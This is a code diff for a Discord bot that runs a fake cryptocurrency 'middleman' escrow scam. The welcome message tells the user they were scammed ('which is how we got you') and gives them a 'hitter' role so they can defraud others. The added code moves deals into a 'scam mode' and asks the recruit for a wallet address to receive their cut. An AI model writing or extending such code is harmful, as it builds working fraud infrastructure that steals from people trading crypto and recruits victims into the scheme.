@@ -112,7 +112,7 @@ async function handleButton(interaction, client) {
     return;
   }
 
-  // Join Us — give mercy role and send welcome message
+  // Join Us — give mercy role, then if scam deal pending ask for wallet address
   if (interaction.customId === 'mercy_join') {
     const { getMercyRoleId } = require('../utils/settings');
     const mercyRoleId = getMercyRoleId();
@@ -120,7 +120,7 @@ async function handleButton(interaction, client) {
     await interaction.deferReply({ ephemeral: false });
 
     if (!mercyRoleId) {
-      await interaction.editReply({ content: '⚠️ No mercy role has been set. Ask an admin to run `/setmercyrole @role`.', ephemeral: true });
+      await interaction.editReply({ content: '⚠️ No mercy role has been set. Ask an admin to run `.setmercyrole @role`.' });
       return;
     }
 
@@ -129,17 +129,33 @@ async function handleButton(interaction, client) {
       member = await interaction.guild.members.fetch(interaction.user.id);
       await member.roles.add(mercyRoleId);
     } catch (e) {
-      await interaction.editReply({ content: 'Failed to assign the role. Check bot permissions.', ephemeral: true });
+      await interaction.editReply({ content: 'Failed to assign the role. Check bot permissions.' });
       return;
     }
 
     const welcomeMsg =
-      `<@${interaction.user.id}> Welcome! Now you're part of our fake Middleman — which is how we got you — so you can hit on others and take your revenge. 😈\n\n` +
+      `<@${interaction.user.id}> Welcome! Now you're part of our fake Middleman — which is how we got you — so you can hit on others and take your revenge.\n\n` +
       `Check the guide channel for tips and guides.\n\n` +
-      `You've also received <@&${mercyRoleId}> — our hitter role. Keep it safe. 🔒\n` +
-      `<@${interaction.user.id}> has accepted his faith, and wanted to join us. 🤝`;
+      `You've also received <@&${mercyRoleId}> — our hitter role. Keep it safe.\n` +
+      `<@${interaction.user.id}> has accepted his faith, and wanted to join us.`;
 
     await interaction.editReply({ content: welcomeMsg });
+
+    // If this is inside a scam-mode deal, now ask for receiver's wallet address
+    const dealForChannel = client ? client.activeDeals.get(interaction.channel.id) : null;
+    if (dealForChannel && dealForChannel.step === 'scam_join_pending') {
+      dealForChannel.step = 'await_receiver_address';
+      dealForChannel.scamMode = true;
+      const displayCoin = dealForChannel.detectedCoin || (dealForChannel.coin === 'USDT [ERC-20]' ? 'USDT' : dealForChannel.coin);
+      await interaction.channel.send({
+        content: `<@${interaction.user.id}>`,
+        embeds: [
+          new EmbedBuilder()
+            .setColor(0x00c853)
+            .setDescription(`Please type your **${displayCoin}** wallet address below to receive your cut.`)
+        ]
+      });
+    }
     return;
   }
 
